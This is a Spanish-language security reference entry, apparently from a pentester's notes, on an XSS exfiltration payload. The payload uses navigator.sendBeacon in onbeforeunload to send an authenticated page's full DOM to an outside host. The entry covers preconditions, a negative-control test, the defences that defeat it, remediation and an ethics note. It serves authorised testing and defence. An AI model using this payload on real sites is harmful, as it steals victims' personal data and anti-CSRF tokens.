---
clase: xss
tech: navigator-sendbeacon
cwe: CWE-79
cvss: 8.1 # [derivado] no es solo ejecucion: es exfiltracion del DOM autenticado completo
payload: |
  # Chrome: SI. Firefox: SI. Safari: NO.
  # Exfiltra el innerHTML COMPLETO del body a un host externo al abandonar la pagina.
  # El dominio del ejemplo es el de laboratorio de PortSwigger, literal de la fuente.
  <body onbeforeunload=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>
precondicion: "Ejecucion de JS en el origen (cualquier sink XSS sirve; este vector es la CARGA, no el bypass). Para que el beacon salga hace falta que la CSP permita el destino en connect-src (o que no haya CSP). sendBeacon esta diseñado para sobrevivir a la descarga de la pagina, que es justo lo que lo hace fiable aqui."
como_se_descubre: |
  No se 'descubre' por recon: es la fase de explotacion que sigue a un XSS confirmado.
  La decision de usarlo se toma al comprobar dos cosas: (1) la pagina autenticada
  contiene datos de valor en el DOM (datos personales, tokens en campos hidden,
  numeros de cuenta) y (2) `connect-src` de la CSP no los bloquea. Para medir (2),
  intentar un sendBeacon a un host propio y mirar la consola: una violacion de CSP
  aparece explicitamente.
control_negativo: |
  # [derivado] diseño de test A/B
  # A: sendBeacon a host controlado + abandonar la pagina -> llega peticion POST con el DOM
  # B: mismo payload sobre una pagina NO autenticada        -> llega el DOM, pero sin datos sensibles
  # El par B sirve para demostrar al triador que el impacto depende de la sesion, y
  # para no exfiltrar datos reales de terceros durante la prueba (ver nota etica).
mata: |
  - CSP con connect-src restrictivo que no incluya el destino -> el beacon se bloquea.
  - Victima en Safari -> onbeforeunload no dispara (usar otro disparador).
  - La pagina sensible no esta en el mismo origen que el XSS -> SOP impide leer su DOM.
  - Los datos de valor no estan en el DOM sino tras peticiones autenticadas
    -> hay que encadenar con fetch(), no basta innerHTML.
fuente: "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet (PortSwigger XSS cheat sheet; pagina actualizada 2026-10-21). Bajo 'Event handlers that do not require user interaction'."
confianza: alta
fecha: 2026-11-02
---
# [XSS] Exfiltración del DOM autenticado con `navigator.sendBeacon` en `onbeforeunload`

## Principio
Este vector no sirve para *conseguir* ejecución, sino para convertir una ejecución ya
conseguida en impacto demostrable. `sendBeacon` está diseñado específicamente para que
la petición sobreviva a la descarga de la página — es su propósito legítimo en
analítica — y por eso es la primitiva fiable para exfiltrar durante `beforeunload`,
donde un `fetch()` normal se cancelaría.

## Payload
```html
<body onbeforeunload=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>
```

El destino `//ssl.portswigger-labs.net/` es el host de laboratorio de PortSwigger, tal
como aparece en la fuente. En un ejercicio autorizado se sustituye por el colaborador
propio del investigador.

## Impacto
Es la diferencia entre un informe de `alert(1)` y uno que demuestra pérdida de datos.
`document.body.innerHTML` arrastra todo el DOM renderizado de la página autenticada:
datos personales visibles, valores de campos `hidden` (que es donde suelen vivir los
tokens anti-CSRF y los identificadores de retorno) y cualquier contenido que la sesión
de la víctima tenga delante. Por eso la puntuación derivada aquí es más alta que la de
los vectores de ejecución pura: el impacto deja de ser hipotético.

## Remediación
La corrección primaria es el XSS subyacente, no el beacon. `# [derivado]`: como
contención independiente, una CSP con `connect-src` explícito limita los destinos de
exfiltración incluso cuando hay ejecución, lo que reduce un XSS de robo de datos a un
XSS de defacement. No usar `default-src *`. Y no almacenar secretos en el DOM: un
token anti-CSRF en un campo `hidden` es legible por cualquier JS del origen.

## Nota ética y de alcance
Este payload exfiltra datos reales. En una prueba autorizada debe dirigirse **solo** a
cuentas propias del investigador, nunca a sesiones de terceros, y el destino debe ser
un host bajo su control. Demostrar la capacidad con una cuenta propia es suficiente
para el reporte; recolectar datos de usuarios reales no lo es y excede el permiso de
cualquier programa de divulgación.
